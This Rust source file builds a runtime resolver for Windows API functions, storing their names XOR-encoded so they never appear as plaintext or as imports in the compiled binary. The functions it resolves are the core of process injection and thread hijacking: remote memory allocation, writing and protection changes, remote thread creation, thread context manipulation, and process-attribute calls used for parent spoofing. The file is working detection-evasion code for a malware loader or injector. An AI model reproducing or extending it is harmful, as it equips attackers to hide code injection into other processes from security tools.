// dynload.rs
// Dynamic API resolution with compile-time XOR-obfuscated function/DLL names.
// All sensitive Win32 functions are resolved at runtime via GetProcAddress;
// their names never appear as plaintext strings in the binary.
// GetProcAddress and LoadLibraryA are the only Win32 imports, both benign.

use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows::Win32::System::Diagnostics::ToolHelp::PROCESSENTRY32;
use windows::Win32::System::Threading::{PROCESS_INFORMATION, STARTUPINFOW};

// ── Function pointer type aliases ─────────────────────────────────────────────

pub type FnOpenProcess          = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
pub type FnCloseHandle          = unsafe extern "system" fn(*mut c_void) -> i32;
pub type FnVirtualProtectEx     = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, *mut u32) -> i32;
pub type FnWriteProcessMemory   = unsafe extern "system" fn(*mut c_void, *mut c_void, *const c_void, usize, *mut usize) -> i32;
pub type FnCreateRemoteThread   = unsafe extern "system" fn(*mut c_void, *const c_void, usize, Option<unsafe extern "system" fn(*mut c_void) -> u32>, *const c_void, u32, *mut u32) -> *mut c_void;
pub type FnInitProcThreadAttr   = unsafe extern "system" fn(*mut c_void, u32, u32, *mut usize) -> i32;
pub type FnUpdateProcThreadAttr = unsafe extern "system" fn(*mut c_void, u32, usize, *const c_void, usize, *mut c_void, *mut usize) -> i32;
pub type FnDeleteProcThreadAttr = unsafe extern "system" fn(*mut c_void);
pub type FnCreateProcessW       = unsafe extern "system" fn(*const u16, *mut u16, *const c_void, *const c_void, i32, u32, *const c_void, *const u16, *const STARTUPINFOW, *mut PROCESS_INFORMATION) -> i32;
pub type FnSnapshot             = unsafe extern "system" fn(u32, u32) -> *mut c_void;
pub type FnProcess32First       = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnProcess32Next        = unsafe extern "system" fn(*mut c_void, *mut PROCESSENTRY32) -> i32;
pub type FnReadProcessMemory    = unsafe extern "system" fn(*mut c_void, *const c_void, *mut c_void, usize, *mut usize) -> i32;
pub type FnEnumProcessModules   = unsafe extern "system" fn(*mut c_void, *mut *mut c_void, u32, *mut u32) -> i32;
pub type FnGetModuleFileNameExA = unsafe extern "system" fn(*mut c_void, *mut c_void, *mut u8, u32) -> u32;
pub type FnResumeThread             = unsafe extern "system" fn(*mut c_void) -> u32;
pub type FnSuspendThread            = unsafe extern "system" fn(*mut c_void) -> u32;
pub type FnNtQueryInformationProcess = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32;
pub type FnSleep                    = unsafe extern "system" fn(u32);
// Thread32First/Thread32Next take a raw [u8;28] to avoid importing THREADENTRY32
pub type FnThread32First            = unsafe extern "system" fn(*mut c_void, *mut u8) -> i32;
pub type FnThread32Next             = unsafe extern "system" fn(*mut c_void, *mut u8) -> i32;
// OpenThread(dwAccess, bInherit, dwThreadId) -> HANDLE
pub type FnOpenThread               = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
// VirtualAllocEx(hProcess, lpAddress, dwSize, flAllocationType, flProtect) -> LPVOID
pub type FnVirtualAllocEx           = unsafe extern "system" fn(*mut c_void, *mut c_void, usize, u32, u32) -> *mut c_void;
// GetThreadContext / SetThreadContext take a raw *mut u8 pointing to a
// CONTEXT struct (1232 bytes on x64). We treat it as opaque bytes.
pub type FnGetThreadContext          = unsafe extern "system" fn(*mut c_void, *mut u8) -> i32;
pub type FnSetThreadContext          = unsafe extern "system" fn(*mut c_void, *const u8) -> i32;


// ── XOR decode (KEY = 0x5A) ───────────────────────────────────────────────────

const KEY: u8 = 0x5A;

fn decode(enc: &[u8]) -> Vec<u8> {
    let mut v: Vec<u8> = enc.iter().map(|b| b ^ KEY).collect();
    v.push(0); // null terminator for PCSTR
    v
}

unsafe fn resolve<T>(dll_enc: &[u8], name_enc: &[u8]) -> Option<T> {
    let dll  = decode(dll_enc);
    let name = decode(name_enc);
    let hmod = LoadLibraryA(PCSTR(dll.as_ptr())).ok()?;
    let proc = GetProcAddress(hmod, PCSTR(name.as_ptr()))?;
    Some(std::mem::transmute_copy(&proc))
}

// ── Encoded names (each byte XOR'd with 0x5A; decode to recover plaintext) ────

// "kernel32.dll"
const K32: &[u8] = &[
    0x31, 0x3F, 0x28, 0x34, 0x3F, 0x36, 0x69, 0x68, 0x74, 0x3E, 0x36, 0x36,
];
// "ntdll.dll"
const NTDLL: &[u8] = &[
    0x34, 0x2E, 0x3E, 0x36, 0x36, 0x74, 0x3E, 0x36, 0x36,
];
// "OpenProcess"
const N_OPEN_PROCESS: &[u8] = &[
    0x15, 0x2A, 0x3F, 0x34, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29,
];
// "CloseHandle"
const N_CLOSE_HANDLE: &[u8] = &[
    0x19, 0x36, 0x35, 0x29, 0x3F, 0x12, 0x3B, 0x34, 0x3E, 0x36, 0x3F,
];
// "VirtualProtectEx"
const N_VIRTUAL_PROTECT_EX: &[u8] = &[
    0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x0A, 0x28, 0x35,
    0x2E, 0x3F, 0x39, 0x2E, 0x1F, 0x22,
];

// "WriteProcessMemory"
const N_WRITE_PROCESS_MEMORY: &[u8] = &[
    0x0D, 0x28, 0x33, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39, 0x3F,
    0x29, 0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
];
// "CreateRemoteThread"
const N_CREATE_REMOTE_THREAD: &[u8] = &[
    0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x08, 0x3F, 0x37, 0x35,
    0x2E, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E,
];
// "InitializeProcThreadAttributeList"
const N_INIT_PROC_THREAD_ATTR_LIST: &[u8] = &[
    0x13, 0x34, 0x33, 0x2E, 0x33, 0x3B, 0x36, 0x33, 0x20, 0x3F,
    0x0A, 0x28, 0x35, 0x39, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E,
    0x1B, 0x2E, 0x2E, 0x28, 0x33, 0x38, 0x2F, 0x2E, 0x3F, 0x16,
    0x33, 0x29, 0x2E,
];
// "UpdateProcThreadAttribute"
const N_UPDATE_PROC_THREAD_ATTR: &[u8] = &[
    0x0F, 0x2A, 0x3E, 0x3B, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39,
    0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x1B, 0x2E, 0x2E, 0x28,
    0x33, 0x38, 0x2F, 0x2E, 0x3F,
];
// "DeleteProcThreadAttributeList"
const N_DELETE_PROC_THREAD_ATTR_LIST: &[u8] = &[
    0x1E, 0x3F, 0x36, 0x3F, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39,
    0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x1B, 0x2E, 0x2E, 0x28,
    0x33, 0x38, 0x2F, 0x2E, 0x3F, 0x16, 0x33, 0x29, 0x2E,
];
// "CreateProcessW"
const N_CREATE_PROCESS_W: &[u8] = &[
    0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0A, 0x28, 0x35, 0x39,
    0x3F, 0x29, 0x29, 0x0D,
];
// "CreateToolhelp32Snapshot"
const N_CREATE_TOOLHELP32_SNAPSHOT: &[u8] = &[
    0x19, 0x28, 0x3F, 0x3B, 0x2E, 0x3F, 0x0E, 0x35, 0x35, 0x36,
    0x32, 0x3F, 0x36, 0x2A, 0x69, 0x68, 0x09, 0x34, 0x3B, 0x2A,
    0x29, 0x32, 0x35, 0x2E,
];
// "Process32First"
const N_PROCESS32_FIRST: &[u8] = &[
    0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x69, 0x68,
    0x1C, 0x33, 0x28, 0x29, 0x2E,
];
// "Process32Next"
const N_PROCESS32_NEXT: &[u8] = &[
    0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29, 0x69, 0x68,
    0x14, 0x3F, 0x22, 0x2E,
];
// "ReadProcessMemory"
const N_READ_PROCESS_MEMORY: &[u8] = &[
    0x08, 0x3F, 0x3B, 0x3E, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29,
    0x29, 0x17, 0x3F, 0x37, 0x35, 0x28, 0x23,
];
// "K32EnumProcessModules"
const N_ENUM_PROCESS_MODULES: &[u8] = &[
    0x11, 0x69, 0x68, 0x1F, 0x34, 0x2F, 0x37, 0x0A, 0x28, 0x35,
    0x39, 0x3F, 0x29, 0x29, 0x17, 0x35, 0x3E, 0x2F, 0x36, 0x3F, 0x29,
];
// "K32GetModuleFileNameExA"
const N_GET_MODULE_FILENAME_EX: &[u8] = &[
    0x11, 0x69, 0x68, 0x1D, 0x3F, 0x2E, 0x17, 0x35, 0x3E, 0x2F,
    0x36, 0x3F, 0x1C, 0x33, 0x36, 0x3F, 0x14, 0x3B, 0x37, 0x3F,
    0x1F, 0x22, 0x1B,
];
// "ResumeThread"
const N_RESUME_THREAD: &[u8] = &[
    0x08, 0x3F, 0x29, 0x2F, 0x37, 0x3F, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E,
];
// "SuspendThread"
const N_SUSPEND_THREAD: &[u8] = &[
    0x09, 0x2F, 0x29, 0x2A, 0x3F, 0x34, 0x3E, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E,
];
// "NtQueryInformationProcess"
const N_NT_QUERY_INFO_PROCESS: &[u8] = &[
    0x14, 0x2E, 0x0B, 0x2F, 0x3F, 0x28, 0x23, 0x13, 0x34, 0x3C, 0x35, 0x28,
    0x37, 0x3B, 0x2E, 0x33, 0x35, 0x34, 0x0A, 0x28, 0x35, 0x39, 0x3F, 0x29, 0x29,
];
// "Sleep"
const N_SLEEP: &[u8] = &[
    0x09, 0x36, 0x3F, 0x3F, 0x2A,
];
// "Thread32First"
const N_THREAD32_FIRST: &[u8] = &[
    0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x69, 0x68, 0x1C, 0x33, 0x28, 0x29, 0x2E,
];
// "Thread32Next"
const N_THREAD32_NEXT: &[u8] = &[
    0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x69, 0x68, 0x14, 0x3F, 0x22, 0x2E,
];
// "OpenThread"
const N_OPEN_THREAD: &[u8] = &[
    0x15, 0x2A, 0x3F, 0x34, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E,
];
// "VirtualAllocEx"
const N_VIRTUAL_ALLOC_EX: &[u8] = &[
    0x0C, 0x33, 0x28, 0x2E, 0x2F, 0x3B, 0x36, 0x1B, 0x36, 0x36, 0x35, 0x39, 0x1F, 0x22,
];
// "GetThreadContext"
const N_GET_THREAD_CONTEXT: &[u8] = &[
    0x1D, 0x3F, 0x2E, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x19, 0x35, 0x34, 0x2E, 0x3F, 0x22, 0x2E,
];
// "SetThreadContext"
const N_SET_THREAD_CONTEXT: &[u8] = &[
    0x09, 0x3F, 0x2E, 0x0E, 0x32, 0x28, 0x3F, 0x3B, 0x3E, 0x19, 0x35, 0x34, 0x2E, 0x3F, 0x22, 0x2E,
];


// ── Public resolver functions ─────────────────────────────────────────────────

pub unsafe fn open_process()            -> Option<FnOpenProcess>          { resolve(K32, N_OPEN_PROCESS) }
pub unsafe fn close_handle()            -> Option<FnCloseHandle>          { resolve(K32, N_CLOSE_HANDLE) }
pub unsafe fn virtual_protect_ex()      -> Option<FnVirtualProtectEx>     { resolve(K32, N_VIRTUAL_PROTECT_EX) }
pub unsafe fn write_process_memory()    -> Option<FnWriteProcessMemory>   { resolve(K32, N_WRITE_PROCESS_MEMORY) }
pub unsafe fn create_remote_thread()    -> Option<FnCreateRemoteThread>   { resolve(K32, N_CREATE_REMOTE_THREAD) }
pub unsafe fn init_proc_thread_attr()   -> Option<FnInitProcThreadAttr>   { resolve(K32, N_INIT_PROC_THREAD_ATTR_LIST) }
pub unsafe fn update_proc_thread_attr() -> Option<FnUpdateProcThreadAttr> { resolve(K32, N_UPDATE_PROC_THREAD_ATTR) }
pub unsafe fn delete_proc_thread_attr() -> Option<FnDeleteProcThreadAttr> { resolve(K32, N_DELETE_PROC_THREAD_ATTR_LIST) }
pub unsafe fn create_process_w()        -> Option<FnCreateProcessW>       { resolve(K32, N_CREATE_PROCESS_W) }
pub unsafe fn toolhelp32_snapshot()     -> Option<FnSnapshot>             { resolve(K32, N_CREATE_TOOLHELP32_SNAPSHOT) }
pub unsafe fn process32_first()         -> Option<FnProcess32First>       { resolve(K32, N_PROCESS32_FIRST) }
pub unsafe fn process32_next()          -> Option<FnProcess32Next>        { resolve(K32, N_PROCESS32_NEXT) }
pub unsafe fn read_process_memory()     -> Option<FnReadProcessMemory>    { resolve(K32, N_READ_PROCESS_MEMORY) }
pub unsafe fn enum_process_modules()    -> Option<FnEnumProcessModules>   { resolve(K32, N_ENUM_PROCESS_MODULES) }
pub unsafe fn get_module_filename_ex()  -> Option<FnGetModuleFileNameExA> { resolve(K32, N_GET_MODULE_FILENAME_EX) }
pub unsafe fn resume_thread()              -> Option<FnResumeThread>             { resolve(K32,   N_RESUME_THREAD) }
pub unsafe fn suspend_thread()             -> Option<FnSuspendThread>            { resolve(K32,   N_SUSPEND_THREAD) }
pub unsafe fn nt_query_information_process() -> Option<FnNtQueryInformationProcess> { resolve(NTDLL, N_NT_QUERY_INFO_PROCESS) }
pub unsafe fn sleep()                      -> Option<FnSleep>                   { resolve(K32,   N_SLEEP) }
pub unsafe fn thread32_first()             -> Option<FnThread32First>           { resolve(K32,   N_THREAD32_FIRST) }
pub unsafe fn thread32_next()              -> Option<FnThread32Next>            { resolve(K32,   N_THREAD32_NEXT) }
pub unsafe fn open_thread()                -> Option<FnOpenThread>              { resolve(K32,   N_OPEN_THREAD) }
pub unsafe fn virtual_alloc_ex()           -> Option<FnVirtualAllocEx>         { resolve(K32,   N_VIRTUAL_ALLOC_EX) }
pub unsafe fn get_thread_context()         -> Option<FnGetThreadContext>        { resolve(K32,   N_GET_THREAD_CONTEXT) }
pub unsafe fn set_thread_context()         -> Option<FnSetThreadContext>        { resolve(K32,   N_SET_THREAD_CONTEXT) }
